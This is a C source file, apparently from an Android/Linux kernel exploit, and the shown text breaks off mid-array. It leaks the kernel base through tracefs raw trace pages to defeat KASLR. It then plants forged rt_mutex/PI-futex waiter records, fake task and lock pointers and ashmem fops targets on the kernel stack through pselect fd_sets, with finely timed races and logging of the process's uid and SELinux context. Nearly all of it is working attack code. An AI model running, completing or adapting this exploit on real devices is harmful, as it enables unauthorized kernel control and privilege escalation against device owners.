#include "common.h"

#include <netinet/in.h>
#if defined(SLIDE_STACK_WRITER) && 
 defined(SLIDE_STACK_WRITER_SIGRETURN) && 
 SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
#include <asm/sigcontext.h>
#include <ucontext.h>
#endif

#ifndef SLIDE_MAX_ATTEMPTS
#define SLIDE_MAX_ATTEMPTS 20
#endif
#if !defined(SLIDE_STACK_WRITER)
#ifndef SLIDE_PSELECT_WORD_SHIFT
#define SLIDE_PSELECT_WORD_SHIFT 0
#endif
#endif
#ifndef SLIDE_WAIT_NSEC
#define SLIDE_WAIT_NSEC 50000000L
#endif
#ifndef SLIDE_REQUEUE_ARM_USEC
#define SLIDE_REQUEUE_ARM_USEC 0
#endif
#define SLIDE_REQUEUE_MAX_POLLS 1000
#define SLIDE_REQUEUE_POLL_USEC 1000

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"

static int slide_tracefs_write(const char *path, const char *value) {
int fd = open(path, O_WRONLY | O_CLOEXEC);
if (fd < 0) {
return 0;
}
size_t len = strlen(value);
ssize_t wrote = write(fd, value, len);
close(fd);
return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
const unsigned char *page, size_t page_len, uint64_t *base_out) {
if (page_len < 20) {
return 0;
}

uint64_t commit = 0;
memcpy(&commit, page + 8, sizeof(commit));
size_t data_len = (size_t)(commit & 0xfffULL);
size_t end = 16 + data_len;
if (end > page_len) {
end = page_len;
}

for (size_t pos = 16; pos + 4 <= end;) {
uint32_t event_header = 0;
memcpy(&event_header, page + pos, sizeof(event_header));
uint32_t type_len = event_header & 0x1fU;
if (type_len == 30) {
pos += 8;
continue;
}
if (type_len == 31) {
pos += 12;
continue;
}
if (type_len == 0 || type_len >= 29) {
break;
}

size_t record_len = (size_t)type_len * 4;
size_t record = pos + 4;
if (record + record_len > end) {
break;
}
uint16_t event_id = 0;
memcpy(&event_id, page + record, sizeof(event_id));
if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
uint64_t caller = 0;
memcpy(&caller, page + record + 16, sizeof(caller));
if (caller >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
uint64_t base = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
if (base >= KIMAGE_TEXT_BASE &&
base <= KIMAGE_TEXT_BASE + 0x1f0000ULL &&
(base & 0xffffULL) == 0) {
*base_out = base;
return 1;
}
}
}
pos = record + record_len;
}
return 0;
}

static int slide_tracefs_resolve_base(uint64_t *base_out) {
static const char tracing_on[] =
SLIDE_TRACEFS_ROOT "/tracing_on";
static const char trace[] =
SLIDE_TRACEFS_ROOT "/trace";
static const char event_enable[] =
SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

if (!slide_tracefs_write(tracing_on, "0") ||
!slide_tracefs_write(event_enable, "1") ||
!slide_tracefs_write(tracing_on, "1")) {
return 0;
}

int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
if (trace_fd >= 0) {
close(trace_fd);
}
sleep(1);
slide_tracefs_write(tracing_on, "0");

int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
int found = 0;
for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
char path[128];
snprintf(path, sizeof(path),
SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
if (fd < 0) {
continue;
}
unsigned char page[PAGE_SIZE];
ssize_t got;
while ((got = read(fd, page, sizeof(page))) > 0) {
if (slide_tracefs_parse_page(page, (size_t)got, base_out)) {
found = 1;
break;
}
}
close(fd);
}
slide_tracefs_write(event_enable, "0");
return found;
}
#endif

#if defined(SLIDE_P0_OFFSET_CANDIDATES) && 
 (!defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE)
static const uintptr_t slide_p0_offsets[] = {
SLIDE_P0_OFFSET_CANDIDATES
};
#endif

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_owner_acquired;
static atomic_int slide_deadlock_seen;
static atomic_int slide_waiter_ok;
static atomic_int slide_route_done;
#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
static atomic_int slide_route_stop;
#endif
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_consumer_ready;
static atomic_int slide_stack_write_window;
static atomic_int slide_pselect_write_window;
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
static atomic_int slide_pselect_last_ret;
static atomic_int slide_pselect_last_errno;
static atomic_uint_fast64_t slide_pselect_last_elapsed_usec;
#endif
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || 
 (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
static atomic_uint_fast64_t slide_pselect_started_ns;
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && ! APP_REQUIRE_FRESH_P0_SESSION
static int slide_pselect_production_stack;
#endif
static int slide_route_nfds = PSELECT_ROUTE_NFDS;
static int slide_route_syscall_pad;
static uint64_t slide_route_fine_delay_ticks;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && ! APP_REQUIRE_FRESH_P0_SESSION
int slide_p0_session_fresh;
#endif
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
int p0_virtual_base_probe;
#endif

static int slide_commit_stext(uint64_t stext, const char *source);
static const uint64_t slide_max_offset = 0x3f8000ULL;

#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#define SLIDE_TRACEFS_CANDIDATES 128
static unsigned int slide_tracefs_raw_pages;
static unsigned int slide_tracefs_raw_bytes;
static unsigned int slide_tracefs_raw_events;
static unsigned int slide_tracefs_raw_callers;
static unsigned int slide_tracefs_parse_failures;
static unsigned int slide_tracefs_candidate_hits[SLIDE_TRACEFS_CANDIDATES];

static int slide_tracefs_write(const char *path, const char *value) {
int fd = open(path, O_WRONLY | O_CLOEXEC);
if (fd < 0) {
pr_warning("slide tracefs open write failed path=%s errno=%d\n", path,
errno);
return 0;
}
size_t len = strlen(value);
size_t done = 0;
while (done < len) {
ssize_t wrote = write(fd, value + done, len - done);
if (wrote < 0 && errno == EINTR) {
continue;
}
if (wrote <= 0) {
pr_warning("slide tracefs write failed path=%s done=%zu len=%zu errno=%d\n",
path, done, len, errno);
close(fd);
return 0;
}
done += (size_t)wrote;
}
if (close(fd) != 0) {
pr_warning("slide tracefs close write failed path=%s errno=%d\n", path,
errno);
return 0;
}
return 1;
}

static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
int fd = open(path, O_RDONLY | O_CLOEXEC);
if (fd < 0) {
pr_warning("slide tracefs open read failed path=%s errno=%d\n", path,
errno);
return 0;
}
char text[32];
ssize_t got;
do {
got = read(fd, text, sizeof(text) - 1);
} while (got < 0 && errno == EINTR);
int read_errno = errno;
if (close(fd) != 0) {
pr_warning("slide tracefs close read failed path=%s errno=%d\n", path,
errno);
return 0;
}
if (got <= 0) {
pr_warning("slide tracefs read failed path=%s got=%zd errno=%d\n", path,
got, read_errno);
return 0;
}
text[got] = 0;
char *end = NULL;
errno = 0;
unsigned long parsed = strtoul(text, &end, 10);
while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
*end == '\n')) {
end++;
}
if (errno || end == text || !end || *end || parsed > UINT32_MAX) {
pr_warning("slide tracefs bad number path=%s value=%s errno=%d\n", path,
text, errno);
return 0;
}
*value = (uint32_t)parsed;
return 1;
}

static int slide_tracefs_clear(const char *path) {
int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
if (fd < 0) {
pr_warning("slide tracefs clear open failed path=%s errno=%d\n", path,
errno);
return 0;
}
if (close(fd) != 0) {
pr_warning("slide tracefs clear close failed path=%s errno=%d\n", path,
errno);
return 0;
}
return 1;
}

static int slide_tracefs_parse_page(const unsigned char *page,
size_t page_len,
uint16_t trace_event_id) {
if (page_len != PAGE_SIZE) {
slide_tracefs_parse_failures++;
return 0;
}
uint64_t commit = 0;
memcpy(&commit, page + 8, sizeof(commit));
size_t data_len = (size_t)(commit & 0xfffULL);
size_t end = 16 + data_len;
if (end > page_len) {
slide_tracefs_parse_failures++;
return 0;
}
for (size_t pos = 16; pos + 4 <= end;) {
uint32_t event_header = 0;
memcpy(&event_header, page + pos, sizeof(event_header));
uint32_t type_len = event_header & 0x1fU;
uint32_t time_delta = event_header >> 5;
if (type_len == 30 || type_len == 31) {
if (pos + 8 > end) {
slide_tracefs_parse_failures++;
return 0;
}
pos += 8;
continue;
}
if (type_len == 29) {
if (!time_delta) {
break;
}
if (pos + 8 > end) {
slide_tracefs_parse_failures++;
return 0;
}
uint32_t padding_len = 0;
memcpy(&padding_len, page + pos + 4, sizeof(padding_len));
size_t total_len = 4 + (size_t)padding_len;
if (total_len < 8 || pos + total_len > end) {
slide_tracefs_parse_failures++;
return 0;
}
pos += total_len;
continue;
}
size_t record;
size_t record_len;
size_t total_len;
if (type_len == 0) {
if (pos + 8 > end) {
slide_tracefs_parse_failures++;
return 0;
}
uint32_t extended_len = 0;
memcpy(&extended_len, page + pos + 4, sizeof(extended_len));
if (extended_len < 4) {
slide_tracefs_parse_failures++;
return 0;
}
record = pos + 8;
record_len = (size_t)extended_len - 4;
total_len = 4 + (size_t)extended_len;
} else if (type_len <= 28) {
record = pos + 4;
record_len = (size_t)type_len * 4;
total_len = 4 + record_len;
} else {
slide_tracefs_parse_failures++;
return 0;
}
if (pos + total_len > end || record + record_len > end) {
slide_tracefs_parse_failures++;
return 0;
}
uint16_t event_id = 0;
memcpy(&event_id, page + record, sizeof(event_id));
slide_tracefs_raw_events++;
if (event_id == trace_event_id) {
if (record_len < 24) {
slide_tracefs_parse_failures++;
return 0;
}
uint64_t caller = 0;
memcpy(&caller, page + record + 16, sizeof(caller));
if (slide_tracefs_raw_callers < 8) {
pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
(unsigned long long)caller, event_id, record_len);
}
slide_tracefs_raw_callers++;
static const uint64_t link_callers[] = {
KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF,
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
KIMAGE_TEXT_BASE + SLIDE_TRACEFS_VFORK_CALLER_OFF,
#endif
};
for (size_t index = 0;
index < sizeof(link_callers) / sizeof(link_callers[0]); index++) {
if (caller >= link_callers[index]) {
uint64_t candidate = caller - link_callers[index];
if (candidate <= slide_max_offset &&
(candidate & 0x7fffULL) == 0) {
size_t slot = (size_t)(candidate >> 15);
slide_tracefs_candidate_hits[slot]++;
}
}
}
}
pos += total_len;
}
return 1;
}

static int slide_tracefs_trigger_vfork(void) {
#ifdef SLIDE_TRACEFS_VFORK_CALLER_OFF
for (int index = 0; index < 96; index++) {
int status = 0;
pid_t child = vfork();
if (child < 0) {
pr_warning("slide tracefs vfork failed errno=%d\n", errno);
return 0;
}
if (child == 0) {
struct timespec hold = {.tv_sec = 0, .tv_nsec = 1000000L};
syscall(SYS_nanosleep, &hold, NULL);
_exit(0);
}
if (waitpid(child, &status, 0) != child) {
pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
return 0;
}
if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
pr_warning("slide tracefs vfork child failed status=%d\n", status);
return 0;
}
}
pr_info("slide tracefs trigger vforks=96 child_sleep_us=1000\n");
return 1;
#else
return 0;
#endif
}

static int slide_tracefs_trigger_io(void) {
char path[96];
snprintf(path, sizeof(path), "/data/local/tmp/.rmg-trace-io-%d", getpid());
int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
if (fd < 0) {
pr_warning("slide tracefs trigger open failed errno=%d\n", errno);
return 0;
}
size_t chunk_size = 0x40000;
unsigned char *chunk = calloc(1, chunk_size);
if (!chunk) {
int saved_errno = errno;
close(fd);
unlink(path);
errno = saved_errno;
pr_warning("slide tracefs trigger alloc failed errno=%d\n", errno);
return 0;
}
int ok = 1;
for (int round = 0; round < 16 && ok; round++) {
size_t done = 0;
while (done < chunk_size) {
ssize_t wrote = write(fd, chunk + done, chunk_size - done);
if (wrote < 0 && errno == EINTR) {
continue;
}
if (wrote <= 0) {
pr_warning("slide tracefs trigger write failed done=%zu size=%zu errno=%d\n",
done, chunk_size, errno);
ok = 0;
break;
}
done += (size_t)wrote;
}
}
free(chunk);
if (ok && fsync(fd) != 0) {
pr_warning("slide tracefs trigger fsync failed errno=%d\n", errno);
ok = 0;
}
if (close(fd) != 0) {
pr_warning("slide tracefs trigger close failed errno=%d\n", errno);
ok = 0;
}
if (unlink(path) != 0) {
pr_warning("slide tracefs trigger unlink failed path=%s errno=%d\n", path,
errno);
ok = 0;
}
if (!ok) {
pr_warning("slide tracefs trigger failed\n");
return 0;
}
pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
return 1;
}

static int slide_tracefs_trigger(void) {
int vfork_ok = slide_tracefs_trigger_vfork();
int io_ok = slide_tracefs_trigger_io();
pr_info("slide tracefs trigger result vfork=%d io=%d\n",
vfork_ok, io_ok);
return vfork_ok || io_ok;
}

static int slide_tracefs_leak_kernel_base(void) {
static const char tracing_on[] =
SLIDE_TRACEFS_ROOT "/tracing_on";
static const char trace[] =
SLIDE_TRACEFS_ROOT "/trace";
static const char event_enable[] =
SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
static const char event_id_path[] =
SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id";
uint32_t old_tracing = 0;
uint32_t old_event = 0;
uint32_t event_id = 0;
int restore_needed = 0;
int setup_ok = 0;
int scan_ok = 1;
int cpu_files = 0;
int candidate_count = 0;
uintptr_t candidate = 0;

if (!slide_tracefs_read_u32(tracing_on, &old_tracing) ||
!slide_tracefs_read_u32(event_enable, &old_event) ||
!slide_tracefs_read_u32(event_id_path, &event_id)) {
return 0;
}
if (old_tracing > 1 || old_event > 1 || event_id > UINT16_MAX ||
event_id != SLIDE_TRACEFS_EVENT_ID) {
pr_warning("slide tracefs profile mismatch tracing=%u event=%u id=%u expected=%u\n",
old_tracing, old_event, event_id, SLIDE_TRACEFS_EVENT_ID);
return 0;
}
restore_needed = 1;
pr_info("slide tracefs state tracing=%u event=%u id=%u\n",
old_tracing, old_event, event_id);
if (!slide_tracefs_write(tracing_on, "0") ||
!slide_tracefs_write(event_enable, "0") ||
!slide_tracefs_clear(trace) ||
!slide_tracefs_write(event_enable, "1") ||
!slide_tracefs_write(tracing_on, "1")) {
pr_warning("slide tracefs setup failed\n");
goto out;
}
if (!slide_tracefs_trigger()) {
goto out;
}
if (!slide_tracefs_write(tracing_on, "0") ||
!slide_tracefs_write(event_enable, "0")) {
pr_warning("slide tracefs stop failed\n");
goto out;
}

long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
if (cpu_count <= 0 || cpu_count > 256) {
pr_warning("slide tracefs bad cpu count=%ld errno=%d\n", cpu_count,
errno);
goto out;
}
slide_tracefs_raw_pages = 0;
slide_tracefs_raw_bytes = 0;
slide_tracefs_raw_events = 0;
slide_tracefs_raw_callers = 0;
slide_tracefs_parse_failures = 0;
memset(slide_tracefs_candidate_hits, 0,
sizeof(slide_tracefs_candidate_hits));
for (int cpu = 0; cpu < cpu_count; cpu++) {
char path[128];
snprintf(path, sizeof(path),
SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
if (fd < 0) {
pr_warning("slide tracefs cpu open failed cpu=%d errno=%d\n", cpu,
errno);
scan_ok = 0;
continue;
}
cpu_files++;
unsigned char page[4096];
for (;;) {
ssize_t got = read(fd, page, sizeof(page));
if (got < 0 && errno == EINTR) {
continue;
}
if (got < 0 && errno == EAGAIN) {
break;
}
if (got < 0) {
pr_warning("slide tracefs cpu read failed cpu=%d errno=%d\n", cpu,
errno);
scan_ok = 0;
break;
}
if (got == 0) {
break;
}
slide_tracefs_raw_pages++;
slide_tracefs_raw_bytes += (unsigned int)got;
if (!slide_tracefs_parse_page(page, (size_t)got,
(uint16_t)event_id)) {
scan_ok = 0;
break;
}
}
if (close(fd) != 0) {
pr_warning("slide tracefs cpu close failed cpu=%d errno=%d\n", cpu,
errno);
scan_ok = 0;
}
}
for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
if (!slide_tracefs_candidate_hits[slot]) {
continue;
}
uintptr_t slot_candidate = slot << 15;
pr_info("slide tracefs candidate=%08zx hits=%u\n",
slot_candidate, slide_tracefs_candidate_hits[slot]);
candidate = slot_candidate;
candidate_count++;
}
pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
slide_tracefs_raw_events, slide_tracefs_raw_callers,
slide_tracefs_parse_failures, candidate_count, cpu_files);
if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
candidate_count != 1) {
pr_warning("slide tracefs candidate gate failed\n");
goto out;
}
setup_ok = 1;

out:
if (restore_needed) {
int restore_ok = 1;
restore_ok &= slide_tracefs_write(tracing_on, "0");
restore_ok &= slide_tracefs_write(event_enable,
old_event ? "1" : "0");
restore_ok &= slide_tracefs_write(tracing_on,
old_tracing ? "1" : "0");
pr_info("slide tracefs restore tracing=%u event=%u ok=%d\n",
old_tracing, old_event, restore_ok);
if (!restore_ok) {
return 0;
}
}
if (!setup_ok) {
return 0;
}
pr_success("slide tracefs caller gate candidate=%08zx\n", candidate);
return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
}
#endif

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
static int slide_commit_virtual_base(uint64_t base, const char *source) {
if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
base < KIMAGE_VIRTUAL_BASE_MIN || base > KIMAGE_VIRTUAL_BASE_MAX ||
base > UINT64_MAX - ASHMEM_FOPS_OFF) {
pr_warning("virtual base rejected source=%s base=%016llx\n",
source, (unsigned long long)base);
return 0;
}
kaslr_base = base;
kaslr_slide = base - KIMAGE_TEXT_BASE;
kaslr_done = 1;
data_addr_canonical = 1;
app_publish_p0_offset(slide_p0_offset);
pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
"virtual_slide=%016llx p0_offset=%08zx\n",
source, getpid(), (unsigned long long)kaslr_base,
(unsigned long long)kaslr_slide, slide_p0_offset);
return 1;
}
#endif

static useconds_t slide_enter_delay_usec(void) {
#if defined(SLIDE_STACK_WRITER)
return 0;
#else
const char *forced = getenv("SLIDE_ENTER_DELAY_USEC");
if (!forced || !*forced) {
forced = getenv("PSELECT_DELAY_USEC");
}
if (forced && *forced) {
char *end = NULL;
errno = 0;
long value = strtol(forced, &end, 0);
if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
return (useconds_t)value;
}
}
return PSELECT_ENTER_DELAY_USEC;
#endif
}

static void slide_wait_before_consume(int sequence) {
if (sequence == 1) {
useconds_t delay = slide_enter_delay_usec();
if (delay) {
usleep(delay);
}
}
}

static uint64_t slide_select_route_fine_delay_ticks(void) {
#if defined(APP_FOPS_ROUTE_FINE_DELAY_TICKS)
const char *override_text = getenv("FINE_TICKS_OVERRIDE");
if (override_text && *override_text) {
char *override_end = NULL;
errno = 0;
unsigned long long override_value =
strtoull(override_text, &override_end, 0);
if (!errno && override_end != override_text && !*override_end) {
return (uint64_t)override_value;
}
}
static const uint64_t delays[] = {
APP_FOPS_ROUTE_FINE_DELAY_TICKS
};
size_t attempt = 1;
const char *text = getenv("S23_SUPERVISOR_ATTEMPT");
if (text && *text) {
char *end = NULL;
errno = 0;
unsigned long value = strtoul(text, &end, 0);
if (errno || end == text || *end || value == 0) {
pr_error("bad S23_SUPERVISOR_ATTEMPT value=%s\n", text);
return UINT64_MAX;
}
attempt = value;
}
return delays[(attempt - 1) % (sizeof(delays) / sizeof(delays[0]))];
#else
return 0;
#endif
}

static int slide_override_route_coarse_delay(int *delay) {
const char *text = getenv("STACK_WRITER_DELAY_USEC");
if (!text || !*text) {
return 1;
}
char *end = NULL;
errno = 0;
long value = strtol(text, &end, 0);
if (errno || end == text || *end || value < 0 || value > 1000000) {
pr_error("bad STACK_WRITER_DELAY_USEC value=%s\n", text);
return 0;
}
*delay = (int)value;
return 1;
}

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
static int slide_s928_fops_delay_override(int *delay) {
const char *forced = getenv("FOPS_DELAY_USEC");
if (!forced || !*forced) {
return 0;
}
char *end = NULL;
errno = 0;
long value = strtol(forced, &end, 0);
if (errno || end == forced || *end || value < 0 || value > 1000000) {
return 0;
}
*delay = (int)value;
return 1;
}
#endif

static inline uint64_t slide_read_cntvct(void) {
uint64_t value;
asm volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
: "=r"(value) :: "memory");
return value;
}

static void slide_apply_route_fine_delay(void) {
uint64_t ticks = slide_route_fine_delay_ticks;
if (!ticks || ticks == UINT64_MAX) {
return;
}
uint64_t start = slide_read_cntvct();
while (slide_read_cntvct() - start < ticks) {
asm volatile("yield" ::: "memory");
}
}

#if !defined(SLIDE_STACK_WRITER)
static uint64_t slide_fdset_get_word(const fd_set *set, int word) {
uint64_t value = 0;
memcpy(&value, (const unsigned char *)set + word * sizeof(value),
sizeof(value));
return value;
}
#endif

static void slide_log_child_context(void) {
char attr[256];
char enforce[32];
read_first_line("/proc/self/attr/current", attr, sizeof(attr));
read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
const char *stack_writer = "pselect";
#if defined(SLIDE_STACK_WRITER) && 
 defined(SLIDE_STACK_WRITER_MCAST) && 
 SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && 
 defined(SLIDE_STACK_WRITER_SIGRETURN) && 
 SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
stack_writer = "sigreturn";
#endif
pr_success("slide child context stack_writer=%s pid=%d uid=%u euid=%u "
"gid=%u egid=%u attr=%s enforce=%s\n",
stack_writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
attr, enforce);
}

#if !defined(SLIDE_STACK_WRITER)
int slide_pselect_words_per_set(void) {
int bits_per_word = (int)(8 * sizeof(unsigned long));
return (slide_route_nfds + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(
fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
int global_word, uint64_t value) {
if (global_word < 0) {
return 0;
}

int set_idx = global_word / words_per_set;
int word_idx = global_word % words_per_set;
switch (set_idx) {
case 0:
fdset_put_word(in, word_idx, value);
return 1;
case 1:
fdset_put_word(out, word_idx, value);
return 1;
case 2:
fdset_put_word(ex, word_idx, value);
return 1;
default:
return 0;
}
}

uint64_t slide_pselect_get_global_word(
const fd_set *in, const fd_set *out, const fd_set *ex,
int words_per_set, int global_word) {
if (global_word < 0) {
return 0;
}

int set_idx = global_word / words_per_set;
int word_idx = global_word % words_per_set;
switch (set_idx) {
case 0:
return slide_fdset_get_word(in, word_idx);
case 1:
return slide_fdset_get_word(out, word_idx);
case 2:
return slide_fdset_get_word(ex, word_idx);
default:
return 0;
}
}

void slide_pselect_put_waiter_word(
fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
int waiter_word, uint64_t value, const char *name) {
int global_word = slide_pselect_global_word(waiter_word);
int placed = slide_pselect_put_global_word(
in, out, ex, words_per_set, global_word, value);
if (!placed) {
pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
"words_per_set=%d nfds=%d\n",
name, waiter_word, global_word, words_per_set,
slide_route_nfds);
}
}

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
#define RMG_RACE_INLINE static inline attribute((always_inline))
#define ACTIVE_PSELECT_WAITER_PRIO SLIDE_FAKE_WAITER_PRIO
#else
#define RMG_RACE_INLINE
#define ACTIVE_PSELECT_WAITER_PRIO FAKE_WAITER_PRIO
#endif

RMG_RACE_INLINE void prepare_slide_pselect_fdsets(
fd_set *in, fd_set *out, fd_set *ex) {
FD_ZERO(in);
FD_ZERO(out);
FD_ZERO(ex);

int words_per_set = slide_pselect_words_per_set();
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
uintptr_t stack_tree_parent = slide_oracle_parent;
uintptr_t stack_tree_right = 0;
uintptr_t stack_tree_left = slide_oracle_target;
uintptr_t stack_pi_parent = slide_oracle_parent;
uintptr_t stack_pi_right = 0;
uintptr_t stack_pi_left = slide_oracle_target;
uintptr_t stack_task = fake_task;
slide_pselect_production_stack = 0;
#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && 
 APP_PRODUCTION_STACK_PI_RIGHT_ONLY
if (slide_oracle_parent == fake_fops &&
slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
/*
* The stale pselect waiter is dequeued from the lock waiter tree before
* the PI-tree requeue. Keep its proven oracle tree and fake-task fields;
* build 58 cleared the tree child and consequently produced no write.
* Isolate only the established FOPS PI-child direction here.
*/
stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
stack_pi_left = 0;
slide_pselect_production_stack = 1;
}
#endif
#else
slide_pselect_production_stack = 0;
#endif
#endif
struct slide_waiter_word {
int word;
uint64_t value;
const char *name;
} words[] = {
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
{0, stack_tree_parent, "tree_pc"},
{1, stack_tree_right, "tree_right"},
{2, stack_tree_left, "tree_left"},
{3, stack_pi_parent, "pi_pc"},
{4, stack_pi_right, "pi_right"},
{5, stack_pi_left, "pi_left"},
#else
{0, slide_oracle_parent, "tree_pc"},
{1, 0, "tree_right"},
{2, slide_oracle_target, "tree_left"},
{3, slide_oracle_parent, "pi_pc"},
{4, 0, "pi_right"},
{5, slide_oracle_target, "pi_left"},
#endif
#else
{0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
{1, 0, "tree_right"},
{2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
{3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
{4, 0, "pi_right"},
{5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
#endif
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && 
 defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
{6, stack_task, "task"},
#else
{6, fake_task, "task"},
#endif
#else
{6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
{7, fake_lock, "lock"},
#if COMPACT_RT_MUTEX_WAITER
{8, ((uint64_t)(uint32_t)ACTIVE_PSELECT_WAITER_PRIO << 32) |
(uint32_t)SLIDE_WAITER_WAKE_STATE,
"wake_state+prio"},
#else
{8, ACTIVE_PSELECT_WAITER_PRIO, "prio"},
#endif
{9, 0, "deadline"},
#if COMPACT_RT_MUTEX_WAITER
{10, 0, "ww_ctx"},
#endif
#else
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
{0, slide_oracle_parent, "tree_pc"},
{1, 0, "tree_right"},
{2, slide_oracle_target, "tree_left"},
{3, ACTIVE_PSELECT_WAITER_PRIO, "tree_prio"},
{5, slide_oracle_parent, "pi0"},
{6, 0, "pi1"},
{7, slide_oracle_target, "pi2"},
#else
{0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
{1, 0, "tree_right"},
{2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
{3, ACTIVE_PSELECT_WAITER_PRIO, "tree_prio"},
{5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
{6, 0, "pi1"},
{7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
#endif
{8, ACTIVE_PSELECT_WAITER_PRIO, "pi_prio"},
{9, 0, "pi_deadline"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
{10, fake_task, "task"},
#else
{10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
{11, fake_lock, "lock"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
{12, 0, "wake_state"},
#else
{12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
#endif
{13, 0, "ww_ctx"},
